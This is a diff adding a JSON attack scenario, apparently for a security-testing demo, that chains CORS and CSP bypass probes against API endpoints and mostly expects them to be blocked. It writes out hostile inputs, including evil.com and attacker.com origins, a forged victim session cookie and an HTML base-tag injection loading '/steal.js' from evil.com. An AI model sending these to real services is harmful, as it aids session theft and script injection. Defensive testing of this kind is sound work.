@@ -1,0 +1,218 @@
+{
+  "id": "api-demo-cors-csp-bypass",
+  "name": "Chimera CORS & CSP Bypass Techniques",
+  "category": "Cross-Origin",
+  "difficulty": "Advanced",
+  "description": "Cross-Origin Resource Sharing and Content Security Policy bypass attacks",
+  "steps": [
+    {
+      "id": "cors-wildcard-probe",
+      "name": "CORS Wildcard Configuration Probe",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "OPTIONS",
+        "url": "/api/v1/auth/status",
+        "headers": {
+          "Origin": "https://evil.com",
+          "Access-Control-Request-Method": "GET"
+        }
+      },
+      "execution": {
+        "delayMs": 300
+      }
+    },
+    {
+      "id": "cors-null-origin",
+      "name": "CORS Null Origin Attack",
+      "stage": "exploitation",
+      "request": {
+        "method": "GET",
+        "url": "/api/users/profile",
+        "headers": {
+          "Origin": "null"
+        }
+      },
+      "execution": {
+        "delayMs": 500
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "cors-wildcard-probe"
+      ]
+    },
+    {
+      "id": "cors-subdomain-takeover",
+      "name": "CORS Subdomain Trust Exploit",
+      "stage": "exploitation",
+      "request": {
+        "method": "GET",
+        "url": "/api/vendors/financial/export",
+        "headers": {
+          "Origin": "https://test.target.com",
+          "Referer": "https://test.target.com"
+        }
+      },
+      "execution": {
+        "delayMs": 600
+      },
+      "dependsOn": [
+        "cors-null-origin"
+      ]
+    },
+    {
+      "id": "cors-credentials-leak",
+      "name": "CORS with Credentials Leak",
+      "stage": "exploitation",
+      "request": {
+        "method": "GET",
+        "url": "/api/v1/auth/session",
+        "headers": {
+          "Origin": "https://attacker.com",
+          "Cookie": "sessionid=victim_session",
+          "X-With-Credentials": "true"
+        }
+      },
+      "execution": {
+        "delayMs": 700
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "cors-subdomain-takeover"
+      ]
+    },
+    {
+      "id": "preflight-bypass",
+      "name": "Preflight Request Bypass",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/data/sensitive",
+        "headers": {
+          "Content-Type": "text/plain",
+          "Origin": "https://malicious.site"
+        },
+        "body": "{\"steal\":\"data\"}"
+      },
+      "execution": {
+        "delayMs": 500
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "cors-credentials-leak"
+      ]
+    },
+    {
+      "id": "csp-bypass-jsonp",
+      "name": "CSP Bypass via JSONP",
+      "stage": "exploitation",
+      "request": {
+        "method": "GET",
+        "url": "/api/jsonp/data?callback=alert"
+      },
+      "execution": {
+        "delayMs": 400
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "preflight-bypass"
+      ]
+    },
+    {
+      "id": "csp-nonce-prediction",
+      "name": "CSP Nonce Prediction",
+      "stage": "exploitation",
+      "request": {
+        "method": "GET",
+        "url": "/api/assets/script.js",
+        "headers": {
+          "X-CSP-Nonce": "predictable123"
+        }
+      },
+      "execution": {
+        "delayMs": 300
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "csp-bypass-jsonp"
+      ]
+    },
+    {
+      "id": "csp-base-uri-bypass",
+      "name": "CSP base-uri Bypass",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/content/render",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "html": "<base href='https://evil.com/'><script src='/steal.js'></script>"
+        }
+      },
+      "execution": {
+        "delayMs": 800
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "csp-nonce-prediction"
+      ]
+    },
+    {
+      "id": "websocket-origin-bypass",
+      "name": "WebSocket Origin Bypass",
+      "stage": "exploitation",
+      "request": {
+        "method": "GET",
+        "url": "/api/ws",
+        "headers": {
+          "Upgrade": "websocket",
+          "Connection": "Upgrade",
+          "Origin": "https://evil.com",
+          "Sec-WebSocket-Version": "13",
+          "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ=="
+        }
+      },
+      "execution": {
+        "delayMs": 900
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "csp-base-uri-bypass"
+      ]
+    },
+    {
+      "id": "cors-cache-poisoning",
+      "name": "CORS Cache Poisoning",
+      "stage": "exploitation",
+      "request": {
+        "method": "GET",
+        "url": "/api/public/data",
+        "headers": {
+          "Origin": "https://evil.com",
+          "X-Cache-Key": "cors-poison"
+        }
+      },
+      "execution": {
+        "delayMs": 600
+      },
+      "dependsOn": [
+        "websocket-origin-bypass"
+      ]
+    }
+  ]
+}
